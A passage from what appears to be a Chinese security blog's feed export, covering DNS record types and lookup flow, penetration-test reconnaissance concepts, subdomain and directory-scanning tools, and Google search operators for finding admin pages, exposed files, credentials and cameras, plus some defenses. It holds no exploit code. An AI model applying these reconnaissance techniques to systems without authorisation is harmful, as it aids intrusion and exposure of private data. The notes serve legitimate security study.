A记录也称为主机记录，是使用最广泛的DNS记录，A记录的基本作用就是说明一个域名对应的IP是多少， 它是域名和IP地址的对应关系，表现形式为 www.contoso.com 192.168.1.1 这就是一个A记录！A记录除了进行域名IP对应以外，还有一个高级用法，可以作为低成本的负载均衡的解决方案，比如说，www.contoso.com 可以创建多个A记录，对应多台物理服务器的IP地址，可以实现基本的流量均衡！)&lt;&#x2F;p&gt;
&lt;p&gt;2，NS记录
NS记录和SOA记录是任何一个DNS区域都不可或缺的两条记录，NS记录也叫名称服务器记录，用于说明这个区域有哪些DNS服务器负责解析，SOA记录说明负责解析的DNS服务器中哪一个是主服务器。因此，任何一个DNS区域都不可能缺少这两条记录。NS记录，说明了在这个区域里，有多少个服务器来承担解析的任务&lt;&#x2F;p&gt;
&lt;p&gt;3，SOA记录
NS记录说明了有多台服务器在进行解析，但哪一个才是主服务器呢，NS并没有说明，这个就要看SOA记录了，SOA名叫起始授权机构记录，SOA记录说明了在众多NS记录里那一台才是主要的服务器！&lt;&#x2F;p&gt;
&lt;p&gt;4，MX记录
全称是邮件交换记录，在使用邮件服务器的时候，MX记录是无可或缺的，比如A用户向B用户发送一封邮件，那么他需要向ＤＮＳ查询Ｂ的MX记录，DNS在定位到了B的MX记录后反馈给A用户，然后Ａ用户把邮件投递到B用户的ＭＸ记录服务器里！&lt;&#x2F;p&gt;
&lt;p&gt;５，Cname记录
又叫别名记录，我们可以这么理解，我们小的时候都会有一个小名，长大了都是学名，那么正规来说学名的符合公安系统的，那个小名只是我们的一个代名词而已，这也存在一个好处，就是比暴漏自己，比如一个网站a.com 在发布的时候，他可以建立一个别名记录，把B.com发不出去，这样不容易被外在用户所察觉！达到隐藏自己的目的！&lt;&#x2F;p&gt;
&lt;p&gt;6，SRV记录
SRV记录是服务器资源记录的缩写，SRV记录是DNS记录中的新鲜面孔，在RFC2052中才对SRV记录进行了定义，因此很多老版本的DNS服务器并不支持SRV记录。那么SRV记录有什么用呢？SRV记录的作用是说明一个服务器能够提供什么样的服务！SRV记录在微软的Active Directory中有着重要地位，大家知道在NT4时代域和DNS并没有太多关系。但从Win2000开始，域就离不开DNS的帮助了，为什么呢？因为域内的计算机要依赖DNS的SRV记录来定位域控制器！表现形式为：—ldap._tcp.contoso.com 600 IN SRV 0 100 389 NS.contoso.com
ladp: 是一个服务，该标识说明把这台服务器当做响应LDAP请求的服务器
tcp：本服务使用的协议，可以是tcp，也可以是用户数据包协议《udp》
contoso.com：此记录所值的域名
600： 此记录默认生存时间（秒）
IN： 标准DNS Internet类
SRV：将这条记录标识为SRV记录
0： 优先级，如果相同的服务有多条SRV记录，用户会尝试先连接优先级最低的记录
100：负载平衡机制，多条SRV并且优先级也相同，那么用户会先尝试连接权重高的记录
389：此服务使用的端口
NS.contoso.com:提供此服务的主机&lt;&#x2F;p&gt;
&lt;p&gt;7,PTR记录
PTR记录也被称为指针记录，PTR记录是A记录的逆向记录，作用是把IP地址解析为域名。由于我们在前面提到过，DNS的反向区域负责从IP到域名的解析，因此如果要创建PTR记录，必须在反向区域中创建。
以上只是一些简单的介绍，并特别说明了SRV记录的格式，如果掌握了这些为以后的AD管理会有很大的帮助！&lt;&#x2F;p&gt;
&lt;p&gt;--------------------------------------------------------------------------------------------&lt;&#x2F;p&gt;
&lt;p&gt;强调：SOA记录和NS记录的通俗解释&lt;&#x2F;p&gt;
&lt;p&gt;DNS服务器里有两个比较重要的记录。一个叫SOA记录（起始授权机构） 一个叫NS（Name Server）记录（域名服务器）关于这两个记录，很多文章都有解释，但是很多人还是很糊涂。我现在通俗的解释一下这两个记录是干什么的。如果理解有错误，欢迎高手来指正。&lt;&#x2F;p&gt;
&lt;p&gt;SOA记录表明了DNS服务器之间的关系。SOA记录表明了谁是这个区域的所有者。比如51CTO.COM这个区域。一个DNS服务器安装后，需要创建一个区域，以后这个区域的查询解析，都是通过DNS服务器来完成的。现在来说一下所有者，我这里所说的所有者，就是谁对这个区域有修改权利。常见的DNS服务器只能创建一个标准区域，然后可以创建很多个辅助区域。标准区域是可以读写修改的。而辅助区域只能通过标准区域复制来完成，不能在辅助区域中进行修改。而创建标准区域的DNS就会有SOA记录，或者准确说SOA记录中的主机地址一定是这个标准区域的服务器IP地址。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Untitled&#x2F;29698941_143463271925Z7.jpg&quot; alt=&quot;29698941_143463271925Z7&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;如果是两台集成了DNS的DC，实际上由于要求DNS区域可写，所以打破了单纯DNS服务器只能有一个标准区域的限制。所以两台DC都有SOA记录指向自己。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Untitled&#x2F;29698941_1434632719buEP.jpg&quot; alt=&quot;29698941_1434632719buEP&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;NS记录实际上也是在DNS服务器之间，表明谁对某个区域有解释权，即权威DNS。大家都知道电信和网通都有很多的DNS服务器。这些服务器为我们上公网做域名解析提供了很多方便。但是这些DNS服务器有一个有意思的地方是这些DNS不存放任何区域，看上去更像是一个DNS CLIENT，它们被称为唯缓存DNS服务器。它们会缓存大量的解析地址，这样就会让你解析的时候选择它们会觉得很快。它们在查询的时候就会查询NS记录，通过这个记录就知道谁在负责比如51CTO.COM这个地域的管理工作。&lt;&#x2F;p&gt;
&lt;p&gt;还有一种情况来说明NS记录的作用。比如你先在万网申请了一个域名ABC.COM。一般情况是万网的域名服务器替你来解析如WWW.ABC.COM这样的主机记录。如果你想自己架设一个DNS服务器，让这台服务器从今往后替代万网的DNS服务器解析，那么你就需要在你的DNS上设置NS记录，然后将万网域名管理系统中的NS记录改成你的DNSIP。这样以后就是你自己的DNS服务器负责提供解析了。即使万网的DNS服务器出现故障，别人仍然可以找到你。&lt;&#x2F;p&gt;
&lt;p&gt;另外值得一说的是，相对你DNS的CLIENT，你设置的DNS服务器地址就是你的权威DNS。通过NSLOOKUP工具可以看到。而那个非权威应答，恰恰是那个区域真正的NS。&lt;&#x2F;p&gt;
&lt;h1 id=&quot;yu-ming-jie-xi-liu-cheng&quot;&gt;域名解析流程&lt;&#x2F;h1&gt;
&lt;h3 id=&quot;0x01-jie-xi-lei-xing&quot;&gt;0x01 解析类型&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;strong&gt;1.&lt;&#x2F;strong&gt; &lt;em&gt;&lt;strong&gt;*A记录*&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;：域名-&amp;gt;IP
1.1 泛解析：*.lsawebtest.top都能指向同一个IP
&lt;em&gt;&lt;strong&gt;*2. cname(别名)记录*&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;：多个名字映射到同一台计算机，如www和mail这两个别名都指向lsawebtest.top，分别提供www和mail服务。
&lt;em&gt;&lt;strong&gt;*3. NS记录*&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;：指定由哪个DNS服务器解析你的域名，如lsawebtest.top&#x2F;ns2.lsawebtest.top
&lt;em&gt;&lt;strong&gt;*4. MX记录*&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;：将以该域名为结尾的电子邮件指向对应的邮件服务器以进行处理，如@lsawebtest.top结尾的邮件发到MX记录的邮件服务器上，权重小的优先。
&lt;em&gt;&lt;strong&gt;*5. TXT记录*&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;：域名的说明，可用于SPF(它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件)和域名所有权验证。
&lt;strong&gt;6.&lt;&#x2F;strong&gt; &lt;em&gt;&lt;strong&gt;*AAAA记录*&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;：指向IPv6。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;0x02-yu-ming-jie-xi-liu-cheng&quot;&gt;0x02 域名解析流程&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;www.lsablog.com&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;dnsquery0.png&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;www.lsablog.com&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;dnsquery0-300x213.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;a&gt;
&#x2F;&#x2F;图片来源于网络
1.先查找hosts文件的映射，找到就直接完成域名解析，否则到第二步。
2.查找本地DNS解析器缓存，有映射就完成解析，命令：ipconfig &#x2F;displaydns，ipconfig &#x2F;flushdns，否则进行第三步。
3.找首选（本地）dns服务器，如果要查询的域名包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析（权威）。如果要查询的域名不由本地DNS服务器区域解析，但该服务器已缓存了此网址映射关系，则调用这个IP地址映射，完成域名解析（非权威）。否则进入第四步。
4.如果设置了dns转发，则此DNS服务器就会把请求转发至上一级DNS服务器，由上一级服务器进行解析，上一级服务器如果不能解析，或找根DNS或把转请求转至上上级，如此循环。如果非转发模式，则首选（本地）dns就把请求发到根dns服务器进行迭代查询直至返回IP到客户机。
以解析www.lsawebtest.top为例：
1.查hosts文件映射，无，下一步。
2.查dns解析器缓存，无，下一步。
3.查首选（本地）dns服务器，无，下一步。
4.首选（本地）dns服务器请求根dns，如图
&lt;a href=&quot;http:&#x2F;&#x2F;www.lsablog.com&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;dnsquery1.png&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;www.lsablog.com&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;dnsquery1-300x160.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;a&gt;
5.本地（首先）dns服务器向其中一台根dns（root-servers.net）发起请求查询www.lsawebtest.top，如图
&lt;a href=&quot;http:&#x2F;&#x2F;www.lsablog.com&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;dnsquery2.png&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;www.lsablog.com&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;dnsquery2-300x79.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;a&gt;
&lt;a href=&quot;http:&#x2F;&#x2F;www.lsablog.com&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;dnsquery3.png&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;www.lsablog.com&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;dnsquery3-300x11.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;a&gt;
返回顶级域top.的ns记录，让你去这几台服务器查询。
6.接着再向其中一台top.域的服务器（c.zdnscloud.com）请求www.lsawebtest.top，返回了lsawebtest.top域的服务器，让你去这其中一台查询，如图
&lt;a href=&quot;http:&#x2F;&#x2F;www.lsablog.com&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;dnsquery4.png&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;www.lsablog.com&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;dnsquery4-300x25.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;a&gt;
&lt;a href=&quot;http:&#x2F;&#x2F;www.lsablog.com&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;dnsquery5.png&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;www.lsablog.com&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;dnsquery5-300x16.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;a&gt;
7.接着再向hichina.com查询www.lsawebtest.top，返回一条别名记录，如图
&lt;a href=&quot;http:&#x2F;&#x2F;www.lsablog.com&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;dnsquery6.png&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;www.lsablog.com&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;dnsquery6-300x19.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;a&gt;
&lt;a href=&quot;http:&#x2F;&#x2F;www.lsablog.com&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;dnsquery7.png&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;www.lsablog.com&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;08&#x2F;dnsquery7-300x13.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;a&gt;
8.当dns请求到别名的时候会终止查询，再对别名发起查询，最终可以获取到一条A记录，就是lsawebtest.top的IP。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;0x03-jie-yu&quot;&gt;0x03 结语&lt;&#x2F;h3&gt;
&lt;p&gt;这里说明一下，全球dns根服务器只有13台是不准确的说法，还有很多是镜像站，有兴趣的可以查一下为什么只能有13台根dns服务器和百度的dns解析过程，稍微复杂一点点。&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>信息搜集</title>
		<published>2020-09-05T00:00:00+00:00</published>
		<updated>2020-09-05T00:00:00+00:00</updated>
		<link href="https://baz.ee/xin-xi-sou-ji/" type="text/html"/>
		<id>https://baz.ee/xin-xi-sou-ji/</id>
		<content type="html">&lt;h1 id=&quot;xin-xi-sou-ji&quot;&gt;信息搜集&lt;&#x2F;h1&gt;
&lt;p&gt;【问】信息、情报有什么区别？&lt;&#x2F;p&gt;
&lt;p&gt;【问】搜集、收集有什么区别?&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;信息搜集分类：&lt;&#x2F;p&gt;
&lt;p&gt;主动信息收集：与目标主动交互&lt;&#x2F;p&gt;
&lt;p&gt;被动信息收集：不与目标主动交互、第三方&lt;&#x2F;p&gt;
&lt;p&gt;信息搜集分为三个阶段：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;目标资产枚举&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;域名&lt;&#x2F;li&gt;
&lt;li&gt;子域名&lt;&#x2F;li&gt;
&lt;li&gt;IP地址&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;目标最有价值的资产是什么？&lt;&#x2F;p&gt;
&lt;p&gt;目标有哪些设备有潜在威胁？&lt;&#x2F;p&gt;
&lt;p&gt;目标有哪些防御措施？&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;​	   我方有哪些有价值的攻击手段？&lt;&#x2F;p&gt;
&lt;p&gt;​	   我方武器会造成什么影响？&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;资产属性关联
&lt;ul&gt;
&lt;li&gt;DNS&lt;&#x2F;li&gt;
&lt;li&gt;旁站：同一服务器上的不同网站&lt;&#x2F;li&gt;
&lt;li&gt;C段：同网段不同服务器&lt;&#x2F;li&gt;
&lt;li&gt;端口&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;资产攻击面分析：
&lt;ul&gt;
&lt;li&gt;关联漏洞&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;端口扫描：&lt;&#x2F;p&gt;
&lt;p&gt;隐藏接口扫描&lt;&#x2F;p&gt;
&lt;p&gt;运维自带后门&lt;&#x2F;p&gt;
&lt;p&gt;已知常见后门&lt;&#x2F;p&gt;
&lt;p&gt;信息搜集的作用：&lt;&#x2F;p&gt;
&lt;p&gt;了解目标、了解自身&lt;&#x2F;p&gt;
&lt;p&gt;明确攻击范围&lt;&#x2F;p&gt;
&lt;p&gt;方便后续的威胁建模&lt;&#x2F;p&gt;
&lt;p&gt;如果你比目标更了解其资产，你就能看到更多可以进去的门。&lt;&#x2F;p&gt;
&lt;p&gt;如果你比目标更了解安全技术，你就拥有更多能打开门的钥匙。&lt;&#x2F;p&gt;
&lt;p&gt;资产攻击面分析指的是，通过搜集到的资产信息，联合已知攻击技术进行威胁建模的过程。&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.secrss.com&#x2F;articles&#x2F;18838&lt;&#x2F;p&gt;
&lt;p&gt;主要关注一下：PASTA威胁建模、OCTAVE威胁建模&lt;&#x2F;p&gt;
&lt;p&gt;钻石模型&lt;&#x2F;p&gt;
&lt;p&gt;基于搜索引擎的信息搜集技术：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;google hacking&lt;&#x2F;p&gt;
&lt;p&gt;google hacking综合应用&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;防御 google hacking&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;shadon hacking &lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;zoomeye hacking&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;fofa hacking&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;搜索引擎
端口扫描
域名与子域名搜集&lt;&#x2F;p&gt;
&lt;p&gt;github、网盘等&lt;&#x2F;p&gt;
&lt;p&gt;dns域传输漏洞&lt;&#x2F;p&gt;
&lt;p&gt;域名及子域名搜集：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;常见域名信息搜集命令&lt;&#x2F;li&gt;
&lt;li&gt;子域名搜集&lt;&#x2F;li&gt;
&lt;li&gt;敏感目录扫描&lt;&#x2F;li&gt;
&lt;li&gt;指纹识别&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;端口扫描：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;简介&lt;&#x2F;li&gt;
&lt;li&gt;用法&lt;&#x2F;li&gt;
&lt;li&gt;防火墙&#x2F;IDS躲避和欺骗&lt;&#x2F;li&gt;
&lt;li&gt;输出&lt;&#x2F;li&gt;
&lt;li&gt;实战演练&lt;&#x2F;li&gt;
&lt;li&gt;脚本扫描&lt;&#x2F;li&gt;
&lt;li&gt;api编程&lt;&#x2F;li&gt;
&lt;li&gt;参考资料&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;payload(有效攻击负载) 是包含在你用于一次漏洞利用(exploit) 中的ShellCode中的主要功能代码&lt;&#x2F;p&gt;
&lt;p&gt;shellcode(可提权代码) 对于一个漏洞来说， ShellCode就是一个用于某个漏洞的二进制代码框  架， 有了这个框架你可以在这个ShellCode中包含你需要的Payload来做一些事情 &lt;&#x2F;p&gt;
&lt;p&gt;exp(Exploit) 漏洞利用， 一般是个demo程序 &lt;&#x2F;p&gt;
&lt;p&gt;poc.(Proof of Concept漏洞证明， 一般就是个样本用来证明和复现&lt;&#x2F;p&gt;
&lt;p&gt;vul：(Vulnerability) ：漏洞&lt;&#x2F;p&gt;
&lt;p&gt;Pwn：是一个黑客语法的俚语词，是指攻破设备或者系统&lt;&#x2F;p&gt;
&lt;p&gt;一些搜索引擎：https:&#x2F;&#x2F;securitytrails.com&#x2F;blog&#x2F;hacker-search-engines&lt;&#x2F;p&gt;
&lt;p&gt;一文读懂域名解析流程：https:&#x2F;&#x2F;www.lsablog.com&#x2F;network&#x2F;network-else&#x2F;understand-dns-by-an-article&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;总结：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86&#x2F;Snipaste_2020-09-05_17-53-55.png&quot; alt=&quot;Snipaste_2020-09-05_17-53-55&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>域名和子域名搜集</title>
		<published>2020-09-05T00:00:00+00:00</published>
		<updated>2020-09-05T00:00:00+00:00</updated>
		<link href="https://baz.ee/yu-ming-he-zi-yu-ming-sou-ji/" type="text/html"/>
		<id>https://baz.ee/yu-ming-he-zi-yu-ming-sou-ji/</id>
		<content type="html">&lt;h2 id=&quot;yu-ming-he-zi-yu-ming-sou-ji&quot;&gt;域名和子域名搜集&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E6%9D%9C%E9%B9%83%E8%9B%8B&#x2F;Snipaste_2020-09-05_16-14-03.png&quot; alt=&quot;Snipaste_2020-09-05_16-14-03&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;一些命令：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;whois&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;nslookup&lt;&#x2F;code&gt;用于查询 dns 记录来确定 ip，查询域名解析是否正常，在网络故障时可以用来诊断网络问题。如果返回域名解析对应多个 ip 地址，那么多半是使用了 cdn。&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;在线 ping 网站： http:&#x2F;&#x2F;ping.chinaz.com&#x2F; https:&#x2F;&#x2F;www.ipip.net&#x2F; &lt;&#x2F;p&gt;
&lt;p&gt;查询 dns 记录网站： https:&#x2F;&#x2F;dnsdb.io&#x2F;zh-cn&#x2F; https:&#x2F;&#x2F;x.threatbook.cn&#x2F; http:&#x2F;&#x2F;toolbar.netcraft.com&#x2F;site_report?url= http:&#x2F;&#x2F;viewdns.info&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;dig&lt;&#x2F;code&gt;查询dns记录，包括NS记录、A记录、MX记录等。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;dig @114.114.114.114&lt;&#x2F;code&gt;指定某个服务器&lt;&#x2F;p&gt;
&lt;p&gt;A记录：域名解析到IP&lt;&#x2F;p&gt;
&lt;p&gt;CNAME记录：域名解析到域名&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;dnsenum&lt;&#x2F;code&gt; 一个工具&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;sublist3r&lt;&#x2F;code&gt;一个工具&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;云悉&lt;&#x2F;code&gt;一个网站&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;SubBrute&lt;&#x2F;code&gt;一个工具&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;OneForAll&lt;&#x2F;code&gt;一个工具&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;curl&lt;&#x2F;code&gt;访问某个网页的源码&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;dirbuster&lt;&#x2F;code&gt;一个工具&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;%E6%9D%9C%E9%B9%83%E8%9B%8B&#x2F;%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200905170522.png&quot; alt=&quot;微信图片_20200905170522&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;dirmap&lt;&#x2F;code&gt;一个工具&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;御剑&lt;&#x2F;code&gt;一个工具&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Google Hacking</title>
		<published>2020-09-04T00:00:00+00:00</published>
		<updated>2020-09-04T00:00:00+00:00</updated>
		<link href="https://baz.ee/google-hacking/" type="text/html"/>
		<id>https://baz.ee/google-hacking/</id>
		<content type="html">&lt;h1 id=&quot;google-hacking&quot;&gt;Google Hacking&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt; +&lt;&#x2F;code&gt;相当于逻辑与&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;|&lt;&#x2F;code&gt;相当于逻辑或&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;&lt;code&gt;-&lt;&#x2F;code&gt;相当于逻辑非（排除）&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;*&lt;&#x2F;code&gt;通配符，匹配任意字符&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;~&lt;&#x2F;code&gt;包含同义词或类似单词&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;.&lt;&#x2F;code&gt;匹配单个字符进行查询&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;“ ”&lt;&#x2F;code&gt;精准匹配双引号内容&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;@&lt;&#x2F;code&gt;用于搜索社交媒体的字体前可以加上@&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;..&lt;&#x2F;code&gt;在数字之间加上 .. 表示在数字范围内搜索&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;site:&lt;&#x2F;code&gt;指定域名搜索相关内容&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;intitle:&lt;&#x2F;code&gt;搜索标题中存在特定关键词的网页&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;allintitle:&lt;&#x2F;code&gt;搜索标题中存在特定关键词的网页&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;inurl:&lt;&#x2F;code&gt;搜索url中存在特定关键词的网页&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;allinurl:&lt;&#x2F;code&gt;搜索url中存在特定关键词的网页&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;intext:&lt;&#x2F;code&gt;搜索正文存在特定关键词的网页&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;filetype:&lt;&#x2F;code&gt;指定文件类型&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;link:&lt;&#x2F;code&gt;显示链接到指定URL的网页列表&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;inanchor&lt;&#x2F;code&gt;搜索网站锚点（https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;28679912、https:&#x2F;&#x2F;www.cnblogs.com&#x2F;littlek1d&#x2F;p&#x2F;9548075.html）&lt;&#x2F;p&gt;
&lt;p&gt;【问】asp, jsp, php 是什么？&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;related:&lt;&#x2F;code&gt;搜索与关键词相似的网站&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;cache:&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;define:&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;【综合应用】&lt;&#x2F;p&gt;
&lt;p&gt;搜索网站后台&lt;&#x2F;p&gt;
&lt;p&gt;搜索可遍历目录的网站文件&lt;&#x2F;p&gt;
&lt;p&gt;查找网站特殊目录&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.hacking8.com&#x2F;uploadfile&#x2F;wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86.pdf&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.cvedetails.com&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;packetstormsecurity.com&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;www.jeepxie.net&#x2F;article&#x2F;165709.html&lt;&#x2F;p&gt;
&lt;p&gt;敏感信息（简历、邮箱、用户名、密码等）&lt;&#x2F;p&gt;
&lt;p&gt;敏感目录（后台地址、备份文件、日志文件等）&lt;&#x2F;p&gt;
&lt;p&gt;摄像头&lt;&#x2F;p&gt;
&lt;p&gt;包含漏洞的地址&lt;&#x2F;p&gt;
&lt;p&gt;使用特定软件特定版本的站点&lt;&#x2F;p&gt;
&lt;p&gt;事件性漏洞&lt;&#x2F;p&gt;
&lt;p&gt;通用性漏洞&lt;&#x2F;p&gt;
&lt;p&gt;如何防御：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;禁止访问未授权的目录或文件
&lt;ul&gt;
&lt;li&gt;给目录添加密码保护或者设置严格的读取权限
&lt;ul&gt;
&lt;li&gt;.htaccess可以用来防止目录的内容未授权的访问，但是不当的配置还会让这个文件可见甚至可读&lt;&#x2F;li&gt;
&lt;li&gt;在Apache的服务器上可以通过httpd.conf文件中的单词indexs前添加一个连字符或者减号来禁止目录列表&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;添加robots.txt&lt;&#x2F;li&gt;
&lt;li&gt;添加NOARCHIVE&lt;&#x2F;li&gt;
&lt;li&gt;使用NOSNIPET&lt;&#x2F;li&gt;
&lt;li&gt;加密敏感信息&lt;&#x2F;li&gt;
&lt;li&gt;向Google申诉&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;【问】robots.txt的作用？&lt;&#x2F;p&gt;
&lt;p&gt;【问】与robots.txt有关的问题是什么？&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;常用 shodan 库函数 &lt;&#x2F;span&gt;&lt;span&gt;
